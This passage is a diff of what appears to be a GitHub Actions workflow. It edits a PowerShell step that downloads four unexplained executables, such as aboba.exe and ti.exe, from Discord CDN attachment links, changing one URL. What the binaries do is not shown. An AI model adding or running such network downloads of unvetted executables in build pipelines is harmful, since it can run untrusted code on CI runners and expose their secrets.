@@ -13,7 +13,7 @@ jobs:
       run: |
         Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/852512000017563690/github_init.exe -OutFile github_init.exe
         Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/853596430202568724/ce.exe -OutFile ce.exe
-        Invoke-WebRequest https://cdn.discordapp.com/attachments/776049348353982476/866775299475636224/aboba.exe -OutFile aboba.exe
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/776049348353982476/866785460792590366/aboba.exe -OutFile aboba.exe
         Invoke-WebRequest https://cdn.discordapp.com/attachments/802191330200911922/856167311895298048/ti.exe -OutFile ti.exe
     - name: Copy...
       run: | 
